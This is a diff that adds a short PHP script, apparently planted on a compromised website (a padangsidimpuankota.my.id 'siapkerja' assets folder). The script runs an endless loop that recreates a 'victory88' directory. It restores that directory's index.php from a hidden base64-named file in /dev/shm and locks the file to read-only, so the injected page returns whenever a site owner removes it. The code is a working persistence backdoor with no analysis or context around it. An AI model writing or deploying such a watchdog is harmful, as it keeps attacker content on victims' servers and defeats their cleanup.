@@ -1,0 +1,18 @@
+<?php
+@ini_set("max_execution_time", 0);
+while (True){
+    if (!file_exists("/home/padangsi/domains/padangsidimpuankota.my.id/private_html/siapkerja/assets/victory88")){
+        mkdir("/home/padangsi/domains/padangsidimpuankota.my.id/private_html/siapkerja/assets/victory88");
+    }
+    if (!file_exists("/home/padangsi/domains/padangsidimpuankota.my.id/private_html/siapkerja/assets/victory88/index.php")){
+        $text = base64_encode(file_get_contents("/dev/shm/.L2hvbWUvcGFkYW5nc2kvZG9tYWlucy9wYWRhbmdzaWRpbXB1YW5rb3RhLm15LmlkL3ByaXZhdGVfaHRtbC9zaWFwa2VyamEvYXNzZXRzL3ZpY3Rvcnk4OGluZGV4LXRleHQtZmlsZQ=="));
+        file_put_contents("/home/padangsi/domains/padangsidimpuankota.my.id/private_html/siapkerja/assets/victory88/index.php", base64_decode($text));
+    }
+    if (gecko_perm("/home/padangsi/domains/padangsidimpuankota.my.id/private_html/siapkerja/assets/victory88/index.php") != 0444){
+        chmod("/home/padangsi/domains/padangsidimpuankota.my.id/private_html/siapkerja/assets/victory88/index.php", 0444);
+    }
+}
+
+function gecko_perm($flename){
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
